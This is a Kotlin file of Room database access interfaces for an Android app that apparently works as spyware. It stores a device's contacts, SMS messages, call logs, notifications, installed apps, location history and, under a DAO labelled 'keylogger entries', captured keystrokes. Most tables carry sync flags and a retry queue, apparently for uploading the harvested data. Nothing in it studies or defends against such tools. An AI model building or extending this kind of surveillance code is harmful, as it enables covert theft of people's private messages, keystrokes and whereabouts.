package com.abuzahra.manager.database.dao

import androidx.room.*
import androidx.sqlite.db.SupportSQLiteQuery
import com.abuzahra.manager.database.entity.*
import kotlinx.coroutines.flow.Flow

/**
 * Contact DAO - Data access for contacts
 */
@Dao
interface ContactDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(contact: ContactEntity): Long
    
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertAll(contacts: List<ContactEntity>)
    
    @Update
    suspend fun update(contact: ContactEntity)
    
    @Delete
    suspend fun delete(contact: ContactEntity)
    
    @Query("DELETE FROM contacts")
    suspend fun deleteAll()
    
    @Query("SELECT * FROM contacts ORDER BY name ASC")
    suspend fun getAll(): List<ContactEntity>
    
    @Query("SELECT * FROM contacts WHERE id = :id")
    suspend fun getById(id: Long): ContactEntity?
    
    @Query("SELECT * FROM contacts WHERE phoneNumber = :phone LIMIT 1")
    suspend fun getByPhone(phone: String): ContactEntity?
    
    @Query("SELECT * FROM contacts WHERE name LIKE '%' || :query || '%' OR phoneNumber LIKE '%' || :query || '%'")
    suspend fun search(query: String): List<ContactEntity>
    
    @Query("SELECT * FROM contacts WHERE synced = 0")
    suspend fun getUnsynced(): List<ContactEntity>
    
    @Query("UPDATE contacts SET synced = 1 WHERE id IN (:ids)")
    suspend fun markSynced(ids: List<Long>)
    
    @Query("SELECT COUNT(*) FROM contacts")
    suspend fun getCount(): Int
    
    @Query("SELECT * FROM contacts WHERE starred = 1 ORDER BY name ASC")
    suspend fun getStarred(): List<ContactEntity>
    
    @RawQuery(observedEntities = [ContactEntity::class])
    fun rawQuery(query: SupportSQLiteQuery): List<ContactEntity>
}

/**
 * SMS DAO - Data access for SMS messages
 */
@Dao
interface SmsDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(sms: SmsEntity): Long
    
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertAll(messages: List<SmsEntity>)
    
    @Update
    suspend fun update(sms: SmsEntity)
    
    @Delete
    suspend fun delete(sms: SmsEntity)
    
    @Query("DELETE FROM sms")
    suspend fun deleteAll()
    
    @Query("SELECT * FROM sms ORDER BY date DESC")
    suspend fun getAll(): List<SmsEntity>
    
    @Query("SELECT * FROM sms WHERE id = :id")
    suspend fun getById(id: Long): SmsEntity?
    
    @Query("SELECT * FROM sms WHERE address = :address ORDER BY date DESC")
    suspend fun getByAddress(address: String): List<SmsEntity>
    
    @Query("SELECT * FROM sms WHERE type = :type ORDER BY date DESC")
    suspend fun getByType(type: Int): List<SmsEntity>
    
    @Query("SELECT * FROM sms WHERE date >= :startTime AND date <= :endTime ORDER BY date DESC")
    suspend fun getByDateRange(startTime: Long, endTime: Long): List<SmsEntity>
    
    @Query("SELECT * FROM sms WHERE body LIKE '%' || :query || '%' ORDER BY date DESC")
    suspend fun search(query: String): List<SmsEntity>
    
    @Query("SELECT * FROM sms WHERE synced = 0")
    suspend fun getUnsynced(): List<SmsEntity>
    
    @Query("UPDATE sms SET synced = 1 WHERE id IN (:ids)")
    suspend fun markSynced(ids: List<Long>)
    
    @Query("SELECT COUNT(*) FROM sms")
    suspend fun getCount(): Int
    
    @Query("SELECT COUNT(*) FROM sms WHERE read = 0")
    suspend fun getUnreadCount(): Int
    
    @Query("SELECT DISTINCT address FROM sms ORDER BY date DESC")
    suspend fun getConversations(): List<String>
    
    @Query("SELECT * FROM sms ORDER BY date DESC LIMIT :limit OFFSET :offset")
    suspend fun getPaged(limit: Int, offset: Int): List<SmsEntity>
}

/**
 * Call DAO - Data access for call logs
 */
@Dao
interface CallDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(call: CallEntity): Long
    
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertAll(calls: List<CallEntity>)
    
    @Update
    suspend fun update(call: CallEntity)
    
    @Delete
    suspend fun delete(call: CallEntity)
    
    @Query("DELETE FROM calls")
    suspend fun deleteAll()
    
    @Query("SELECT * FROM calls ORDER BY date DESC")
    suspend fun getAll(): List<CallEntity>
    
    @Query("SELECT * FROM calls WHERE id = :id")
    suspend fun getById(id: Long): CallEntity?
    
    @Query("SELECT * FROM calls WHERE number = :number ORDER BY date DESC")
    suspend fun getByNumber(number: String): List<CallEntity>
    
    @Query("SELECT * FROM calls WHERE type = :type ORDER BY date DESC")
    suspend fun getByType(type: Int): List<CallEntity>
    
    @Query("SELECT * FROM calls WHERE date >= :startTime AND date <= :endTime ORDER BY date DESC")
    suspend fun getByDateRange(startTime: Long, endTime: Long): List<CallEntity>
    
    @Query("SELECT * FROM calls WHERE synced = 0")
    suspend fun getUnsynced(): List<CallEntity>
    
    @Query("UPDATE calls SET synced = 1 WHERE id IN (:ids)")
    suspend fun markSynced(ids: List<Long>)
    
    @Query("SELECT COUNT(*) FROM calls")
    suspend fun getCount(): Int
    
    @Query("SELECT SUM(duration) FROM calls")
    suspend fun getTotalDuration(): Long?
    
    @Query("SELECT * FROM calls ORDER BY date DESC LIMIT :limit OFFSET :offset")
    suspend fun getPaged(limit: Int, offset: Int): List<CallEntity>
}

/**
 * Notification DAO - Data access for notifications
 */
@Dao
interface NotificationDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(notification: NotificationEntity): Long
    
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertAll(notifications: List<NotificationEntity>)
    
    @Delete
    suspend fun delete(notification: NotificationEntity)
    
    @Query("DELETE FROM notifications")
    suspend fun deleteAll()
    
    @Query("DELETE FROM notifications WHERE timestamp < :beforeTime")
    suspend fun deleteOlderThan(beforeTime: Long): Int
    
    @Query("SELECT * FROM notifications ORDER BY timestamp DESC")
    suspend fun getAll(): List<NotificationEntity>
    
    @Query("SELECT * FROM notifications WHERE id = :id")
    suspend fun getById(id: Long): NotificationEntity?
    
    @Query("SELECT * FROM notifications WHERE packageName = :packageName ORDER BY timestamp DESC")
    suspend fun getByPackage(packageName: String): List<NotificationEntity>
    
    @Query("SELECT * FROM notifications WHERE category = :category ORDER BY timestamp DESC")
    suspend fun getByCategory(category: String): List<NotificationEntity>
    
    @Query("SELECT * FROM notifications WHERE timestamp >= :startTime AND timestamp <= :endTime ORDER BY timestamp DESC")
    suspend fun getByDateRange(startTime: Long, endTime: Long): List<NotificationEntity>
    
    @Query("SELECT * FROM notifications WHERE title LIKE '%' || :query || '%' OR text LIKE '%' || :query || '%' ORDER BY timestamp DESC")
    suspend fun search(query: String): List<NotificationEntity>
    
    @Query("SELECT * FROM notifications WHERE synced = 0")
    suspend fun getUnsynced(): List<NotificationEntity>
    
    @Query("UPDATE notifications SET synced = 1 WHERE id IN (:ids)")
    suspend fun markSynced(ids: List<Long>)
    
    @Query("SELECT COUNT(*) FROM notifications")
    suspend fun getCount(): Int
    
    @Query("SELECT DISTINCT packageName FROM notifications")
    suspend fun getPackageList(): List<String>
    
    @Query("SELECT packageName, COUNT(*) as count FROM notifications GROUP BY packageName ORDER BY count DESC")
    suspend fun getPackageStats(): List<PackageStat>

    data class PackageStat(val packageName: String, val count: Int)
}

/**
 * App DAO - Data access for installed apps
 */
@Dao
interface AppDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(app: AppEntity): Long
    
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertAll(apps: List<AppEntity>)
    
    @Update
    suspend fun update(app: AppEntity)
    
    @Delete
    suspend fun delete(app: AppEntity)
    
    @Query("DELETE FROM installed_apps")
    suspend fun deleteAll()
    
    @Query("SELECT * FROM installed_apps ORDER BY appName ASC")
    suspend fun getAll(): List<AppEntity>
    
    @Query("SELECT * FROM installed_apps WHERE id = :id")
    suspend fun getById(id: Long): AppEntity?
    
    @Query("SELECT * FROM installed_apps WHERE packageName = :packageName LIMIT 1")
    suspend fun getByPackage(packageName: String): AppEntity?
    
    @Query("SELECT * FROM installed_apps WHERE appName LIKE '%' || :query || '%' OR packageName LIKE '%' || :query || '%'")
    suspend fun search(query: String): List<AppEntity>
    
    @Query("SELECT * FROM installed_apps WHERE isSystemApp = 0 ORDER BY appName ASC")
    suspend fun getUserApps(): List<AppEntity>
    
    @Query("SELECT * FROM installed_apps WHERE isSystemApp = 1 ORDER BY appName ASC")
    suspend fun getSystemApps(): List<AppEntity>
    
    @Query("SELECT * FROM installed_apps WHERE synced = 0")
    suspend fun getUnsynced(): List<AppEntity>
    
    @Query("UPDATE installed_apps SET synced = 1 WHERE id IN (:ids)")
    suspend fun markSynced(ids: List<Long>)
    
    @Query("SELECT COUNT(*) FROM installed_apps")
    suspend fun getCount(): Int
    
    @Query("SELECT SUM(appSize) FROM installed_apps")
    suspend fun getTotalSize(): Long?
}

/**
 * Device Event DAO - Data access for device events
 */
@Dao
interface DeviceEventDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(event: DeviceEventEntity): Long
    
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertAll(events: List<DeviceEventEntity>)
    
    @Delete
    suspend fun delete(event: DeviceEventEntity)
    
    @Query("DELETE FROM device_events WHERE timestamp < :beforeTime")
    suspend fun deleteOlderThan(beforeTime: Long): Int
    
    @Query("SELECT * FROM device_events ORDER BY timestamp DESC")
    suspend fun getAll(): List<DeviceEventEntity>
    
    @Query("SELECT * FROM device_events WHERE eventType = :type ORDER BY timestamp DESC")
    suspend fun getByType(type: String): List<DeviceEventEntity>
    
    @Query("SELECT * FROM device_events WHERE eventCategory = :category ORDER BY timestamp DESC")
    suspend fun getByCategory(category: String): List<DeviceEventEntity>
    
    @Query("SELECT * FROM device_events WHERE severity >= :minSeverity ORDER BY timestamp DESC")
    suspend fun getBySeverity(minSeverity: Int): List<DeviceEventEntity>
    
    @Query("SELECT * FROM device_events WHERE timestamp >= :startTime AND timestamp <= :endTime ORDER BY timestamp DESC")
    suspend fun getByDateRange(startTime: Long, endTime: Long): List<DeviceEventEntity>
    
    @Query("SELECT COUNT(*) FROM device_events")
    suspend fun getCount(): Int
    
    @Query("SELECT COUNT(*) FROM device_events WHERE acknowledged = 0")
    suspend fun getUnacknowledgedCount(): Int
    
    @Query("UPDATE device_events SET acknowledged = 1 WHERE id = :id")
    suspend fun acknowledge(id: Long)
}

/**
 * Location DAO - Data access for location history
 */
@Dao
interface LocationDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(location: LocationEntity): Long
    
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertAll(locations: List<LocationEntity>)
    
    @Delete
    suspend fun delete(location: LocationEntity)
    
    @Query("DELETE FROM locations")
    suspend fun deleteAll()
    
    @Query("DELETE FROM locations WHERE timestamp < :beforeTime")
    suspend fun deleteOlderThan(beforeTime: Long): Int
    
    @Query("SELECT * FROM locations ORDER BY timestamp DESC")
    suspend fun getAll(): List<LocationEntity>
    
    @Query("SELECT * FROM locations ORDER BY timestamp DESC LIMIT :limit")
    suspend fun getRecent(limit: Int): List<LocationEntity>
    
    @Query("SELECT * FROM locations WHERE timestamp >= :startTime AND timestamp <= :endTime ORDER BY timestamp DESC")
    suspend fun getByDateRange(startTime: Long, endTime: Long): List<LocationEntity>
    
    @Query("SELECT * FROM locations WHERE synced = 0")
    suspend fun getUnsynced(): List<LocationEntity>
    
    @Query("UPDATE locations SET synced = 1 WHERE id IN (:ids)")
    suspend fun markSynced(ids: List<Long>)
    
    @Query("SELECT COUNT(*) FROM locations")
    suspend fun getCount(): Int
    
    @Query("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 1")
    suspend fun getLastLocation(): LocationEntity?
}

/**
 * Sync Queue DAO - Data access for sync queue
 */
@Dao
interface SyncQueueDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(item: SyncQueueEntity): Long
    
    @Update
    suspend fun update(item: SyncQueueEntity)
    
    @Delete
    suspend fun delete(item: SyncQueueEntity)
    
    @Query("DELETE FROM sync_queue WHERE status = 'completed'")
    suspend fun deleteCompleted()
    
    @Query("SELECT * FROM sync_queue WHERE status = 'pending' ORDER BY priority DESC, createdAt ASC")
    suspend fun getPending(): List<SyncQueueEntity>
    
    @Query("SELECT * FROM sync_queue WHERE status = 'pending' ORDER BY priority DESC, createdAt ASC LIMIT :limit")
    suspend fun getPendingBatch(limit: Int): List<SyncQueueEntity>
    
    @Query("SELECT * FROM sync_queue WHERE status = 'failed' AND retryCount < maxRetries ORDER BY nextAttempt ASC")
    suspend fun getRetryable(): List<SyncQueueEntity>
    
    @Query("SELECT * FROM sync_queue WHERE status = 'in_progress' AND lastAttempt < :timeout")
    suspend fun getStale(timeout: Long): List<SyncQueueEntity>
    
    @Query("UPDATE sync_queue SET status = :status, lastAttempt = :lastAttempt WHERE id = :id")
    suspend fun updateStatus(id: Long, status: String, lastAttempt: Long)
    
    @Query("UPDATE sync_queue SET status = 'failed', error = :error, retryCount = retryCount + 1, nextAttempt = :nextAttempt WHERE id = :id")
    suspend fun markFailed(id: Long, error: String, nextAttempt: Long)
    
    @Query("UPDATE sync_queue SET status = 'completed' WHERE id = :id")
    suspend fun markCompleted(id: Long)
    
    @Query("SELECT COUNT(*) FROM sync_queue WHERE status = 'pending'")
    suspend fun getPendingCount(): Int
    
    @Query("SELECT COUNT(*) FROM sync_queue WHERE status = 'failed'")
    suspend fun getFailedCount(): Int
}

/**
 * Keylog DAO - Data access for keylogger entries
 */
@Dao
interface KeylogDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(entry: KeylogEntity): Long
    
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertAll(entries: List<KeylogEntity>)
    
    @Delete
    suspend fun delete(entry: KeylogEntity)
    
    @Query("DELETE FROM keylog")
    suspend fun deleteAll()
    
    @Query("DELETE FROM keylog WHERE timestamp < :beforeTime")
    suspend fun deleteOlderThan(beforeTime: Long): Int
    
    @Query("SELECT * FROM keylog ORDER BY timestamp ASC")
    suspend fun getAll(): List<KeylogEntity>
    
    @Query("SELECT * FROM keylog WHERE packageName = :packageName ORDER BY timestamp ASC")
    suspend fun getByPackage(packageName: String): List<KeylogEntity>
    
    @Query("SELECT * FROM keylog WHERE timestamp >= :startTime AND timestamp <= :endTime ORDER BY timestamp ASC")
    suspend fun getByDateRange(startTime: Long, endTime: Long): List<KeylogEntity>
    
    @Query("SELECT * FROM keylog WHERE synced = 0 ORDER BY timestamp ASC")
    suspend fun getUnsynced(): List<KeylogEntity>
    
    @Query("UPDATE keylog SET synced = 1 WHERE id IN (:ids)")
    suspend fun markSynced(ids: List<Long>)
    
    @Query("SELECT COUNT(*) FROM keylog")
    suspend fun getCount(): Int
    
    @Query("SELECT * FROM keylog ORDER BY timestamp DESC LIMIT :limit OFFSET :offset")
    suspend fun getPaged(limit: Int, offset: Int): List<KeylogEntity>
}
